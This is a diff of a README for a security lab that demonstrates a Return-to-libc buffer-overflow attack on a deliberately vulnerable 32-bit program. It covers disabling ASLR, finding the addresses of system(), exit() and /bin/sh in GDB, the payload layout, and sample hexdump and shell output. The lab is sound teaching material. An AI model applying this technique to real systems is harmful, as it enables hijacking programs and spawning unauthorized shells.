@@ -1,25 +1,21 @@
-# Lab2-Libc-Attack
-
-This lab demonstrates a **Return-to-libc** exploitation technique on a **32-bit Linux** system. The objective is to exploit a vulnerable program (`retlib`) with a non-executable stack by reusing existing `libc` functions (`system()` and `exit()`) to execute `/bin/sh`, without injecting shellcode.
+# Lab 2 — Libc-Attack
 
 ## Overview
 
 This project implements a classic stack-based buffer overflow to demonstrate a **Return-to-libc (ret2libc)** attack on a 32-bit Linux binary with a non-executable stack (NX bit).
 
-**Key Objectives:**
-- Demonstrate a buffer overflow vulnerability.
-- Bypass stack execution protections (NX) by reusing existing code from `libc`.
-- Successfully spawn a `/bin/sh` shell by overwriting the return address to call `system()`.
-- Illustrate stack frame layout and function call conventions in 32-bit x86.
-
 ## Prerequisites
+
 - 32-bit Linux VM (lab environment)
 - `gcc` with multilib support (if building 32-bit on a 64-bit host)
 - Python 3
-- GDB (with **peda** or similar is helpful)
-- Example seed image: [https://seedsecuritylabs.org/lab_env.html](https://seedsecuritylabs.org/lab_env.html)
+- GDB (with **peda** or a similar helper is helpful)
+- Example seed image: https://seedsecuritylabs.org/lab_env.html
 
-## Repository Files
+---
+
+## Repository files
+
 | File | Description |
 |------|-------------|
 | `retlib.c` | Vulnerable program with a stack-based buffer overflow. |
@@ -29,99 +25,126 @@ This project implements a classic stack-based buffer overflow to demonstrate a *
 | `README.md` | This documentation. |
 | `images/` | Screenshots of the exploitation process. |
 
-### Image References
-- `images/01-envaddr.png`: Output of the `envaddr` helper program.
-- `images/02-hexdump.png`: Hexdump of the `badfile` payload.
+### Image references
 
-## Exploitation Flow
+![Output of envaddr helper](images/01-envaddr.png)
+
+![Hexdump of badfile payload](images/02-hexdump.png)
+
+---
+
+## Exploitation flow
+
 The attack bypasses the non-executable stack by overwriting the saved return address to point to the `system()` function in `libc`.
 
-1. **Disable ASLR**
-   - Run: `echo 0 > /proc/sys/kernel/randomize_va_space` (as root) for stable `libc` addresses.
+**High-level steps:**
 
-2. **Find Target Addresses**
-   - Set environment variable: `export MYSHELL=/bin/sh`.
-   - Use `envaddr` or GDB to find the runtime address of `"/bin/sh"`.
-   - Use GDB on `retlib` to find `system()` and `exit()` addresses in `libc`.
+1. Disable ASLR (optional for lab reproducibility).
+2. Find addresses for `/bin/sh`, `system()`, and `exit()`.
+3. Construct a payload that overwrites the saved return address and places arguments for `system()` on the stack.
+4. Run the vulnerable program with the crafted payload to spawn a shell.
 
-3. **Construct Payload**
-   - The `exploit.py` script creates `badfile` to overflow the `buffer` in `bof()` and overwrite the stack frame.
-   - **Payload Layout:**
-[ A * (Offset to EBP) ] + [ Saved EBP ] + [ system_addr ] + [ exit_addr ] + [ sh_addr ]
-text- Fills the buffer, restores saved EBP, and hijacks the return address.
+### Detailed steps
 
-4. **Execute Exploit**
-- `retlib` reads `badfile`, triggering the overflow.
-- On return, control flows to `system()`, executing `/bin/sh`.
-- `exit()` ensures clean termination.
+1. **Disable ASLR (for repeatable addresses in this lab)**
 
-## How to Compile and Run
-### 1. Disable ASLR (as root)
+   > **Warning:** Disabling ASLR affects system security. Do this only in a controlled lab VM and revert afterward.
+
+   ```bash
+   # As root
+   echo 0 > /proc/sys/kernel/randomize_va_space
+   ```
+
+2. **Set up environment and find target addresses**
+
+   ```bash
+   # Make sure /bin/sh is set as an environment variable (used by envaddr)
+   export MYSHELL=/bin/sh
+
+   # Compile and run envaddr (see section "How to compile")
+   ./envaddr
+   # Example output: Address: 0xbfffff01
+   ```
+
+   Use GDB (or `readelf`/`objdump` on libc) to find `system()` and `exit()` addresses in the process's libc mapping. Example using GDB:
+
+   ```gdb
+   gdb -q ./retlib
+   (gdb) run < badfile
+   (gdb) p (void*) system
+   (gdb) p (void*) exit
+   ```
+
+   You may also attach to a running process or inspect `/proc/<pid>/maps` to locate libc.
+
+3. **Construct the payload**
+
+   The `exploit.py` script produces a `badfile` that overflows the vulnerable buffer and overwrites the saved return address.
+
+   **Typical payload layout (32-bit, little-endian):**
+
+   ```
+   [ padding up to saved EBP ]
+   [ saved EBP (optional placeholder) ]
+   [ system_addr (overwritten return address) ]
+   [ exit_addr   (next return address, used by system as cleanup) ]
+   [ sh_addr     (pointer to "/bin/sh" string) ]
+   ```
+
+   This layout ensures that when the function returns it jumps to `system()` with the address of `/bin/sh` as its argument. After `system()` returns, control goes to `exit()`.
+
+4. **Execute the exploit**
+
+   ```bash
+   # Generate badfile (after updating exploit.py with discovered addresses)
+   python3 exploit.py
+
+   # Run vulnerable program (it reads badfile and triggers overflow)
+   ./retlib
+   ```
+
+   If successful, `system("/bin/sh")` runs and spawns a shell.
+
+---
+
+## How to compile (examples)
+
+1. Compile 32-bit vulnerable binary and helper:
+
 ```bash
-echo 0 > /proc/sys/kernel/randomize_va_space
-2. Compile (32-bit)
-bashgcc -m32 -o retlib retlib.c -fno-stack-protector -z noexecstack
+# Compile retlib as 32-bit disabling stack protector and keeping stack non-executable
+gcc -m32 -o retlib retlib.c -fno-stack-protector -z noexecstack
+
+# Compile envaddr helper
 gcc -m32 -o envaddr envaddr.c
-3. Get Addresses
-bashexport MYSHELL=/bin/sh
+```
+
+> Note: Some toolchains require additional packages (multilib). On Debian/Ubuntu you may need `gcc-multilib` and `libc6-dev-i386`.
+
+---
+
+## Example workflow & output (illustrative)
+
+```bash
+export MYSHELL=/bin/sh
 ./envaddr
-# Example output: Address: 0xbfffff01
-gdb -q ./retlib
-(gdb) p (void*) system
-# Example: $1 = (void *) 0xb7da4da0 <__libc_system>
-(gdb) p (void*) exit
-# Example: $2 = (void *) 0xb7d989d0 <__GI_exit>
-4. Build and Run Exploit
-Update exploit.py with addresses from Step 3.
-bashpython3 exploit.py
+# Example: Address: 0xbfffff01
+
+# After updating exploit.py with discovered addresses
+python3 exploit.py
+hexdump -C badfile | tail
+# ... hexdump shows the little-endian addresses for system, exit, and "/bin/sh"
+
 ./retlib
-Example Output
-bash[10/02/25]seed@VM:~/Desktop$ python3 exploit.py
-[10/02/25]seed@VM:~/Desktop$ hexdump -C badfile | tail
-00000000  aa aa aa aa aa aa aa aa  aa aa aa aa aa aa aa aa  |................|
-*
-00000110  aa aa aa aa aa aa aa aa  aa aa 48 f3 ff bf a0 4d  |..........H....M|
-00000120  da b7 d0 89 d9 b7 fd fe  ff bf                    |..........|
-0000012a
-[10/02/25]seed@VM:~/Desktop$ ./retlib
-Address of input[] inside main():  0xbfffef70
-Input size: 298
-Address of buffer[] inside bof():  0xbfffee3e
-Frame Pointer value inside bof():  0xbfffef58
-[10/02/25]seed@VM:~/Desktop$ whoami
-seed
-[10/02/25]seed@VM:~/Desktop$ echo $?
-0
-Step-by-Step Demonstration
+# Program prints buffer addresses and, on success, you get a shell
+whoami   # -> seed
+echo $?  # -> 0
+```
 
-Get Target Addresses
-
-Use envaddr for /bin/sh address and GDB for system() and exit().
-
-
-Payload Generation
-
-exploit.py generates badfile. Hexdump shows system, exit, and /bin/sh addresses in little-endian.
-
-
-Successful Exploit
-
-Running ./retlib consumes badfile, overflows the buffer, and spawns a shell (whoami returns seed).
+---
 
 
 
-Summary of Results
-
-Task: Use Return-to-libc to execute /bin/sh in a 32-bit program with a non-executable stack.
-Result: Success — system("/bin/sh") spawned an interactive shell.
-Key Lessons:
-
-Use process-specific /bin/sh address due to differing environment layouts.
-Restore saved EBP to prevent stack corruption by the leave instruction.
-Keep ASLR disabled for predictable addresses in a lab environment.
-
-
-
-Author
+## Author
 Prepared by: Abdulrahman ALQunaibit
 Lab date: October 2, 2025
